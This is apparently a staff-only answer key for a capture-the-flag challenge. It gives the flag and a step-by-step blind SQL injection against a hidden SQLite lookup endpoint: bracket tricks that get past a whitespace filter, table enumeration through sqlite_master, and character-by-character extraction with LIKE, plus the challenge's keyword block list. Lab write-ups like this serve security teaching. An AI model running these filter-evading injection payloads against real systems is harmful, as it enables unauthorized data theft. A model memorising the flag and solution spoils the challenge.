# Solution (staff only, do not share with players)

Flag: CGS{m3d_l1ke_h1dd3n}

The vulnerable endpoint, /catalog/lookup?ref=, is NOT linked anywhere in
the site navigation. Every other page (catalog, book detail, department
filter) uses parameterized queries and is safe.

## Step 1: find the hidden route

- View page source on the home page footer: a comment mentions
  "/catalog/lookup?ref= tool is still live".
- Or check /robots.txt: it disallows /catalog/lookup, which is itself a
  hint pointing at the route.

## Step 2: confirm boolean injection

- /catalog/lookup?ref=1 -> "Reference found" (book id 1 is real)
- /catalog/lookup?ref=999 -> "No matching record"
- /catalog/lookup?ref=1 AND 1=1 -> "No matching record" (space is
  blocked, but it fails SILENTLY — same message as a false condition,
  no error, no "blocked" wording)
- Bypass the space with brackets: /catalog/lookup?ref=(1)and(1=1) ->
  "Reference found". /catalog/lookup?ref=(1)and(1=2) -> "No matching
  record". Confirmed.

## Step 3: find the hidden tables

substr, length and count are blocked, so use a LIMIT-based existence
check instead of count():

```
/catalog/lookup?ref=(1)and((select(1)from(sqlite_master)where(name='secure_meta')limit(1))=1)
```

This reveals three tables: secure_meta, archive_meta, vault_notes.

## Step 4: extract each part with LIKE (no substr/length)

Since substr/length are blocked, build the string with LIKE prefix
matching:

```
/catalog/lookup?ref=(1)and((select(1)from(secure_meta)where(tag='part_one')and(payload)like('m%')limit(1))=1)
```

If "Reference found", the first character is m. Keep extending the
prefix (m3%, m3d%, ...) until a LIKE match with no trailing % succeeds —
that means the string is complete.

Repeat for:
- secure_meta / tag='part_one'   -> m3d_
- archive_meta / tag='part_two'  -> l1ke_
- vault_notes / tag='part_three' -> h1dd3n

## Step 5: combine

CGS{m3d_l1ke_h1dd3n}

Blocked keywords: union, sleep, benchmark, substr, substring, length,
count, hex, char(, load_extension, randomblob, group_concat, --, /*, #,
and any whitespace.
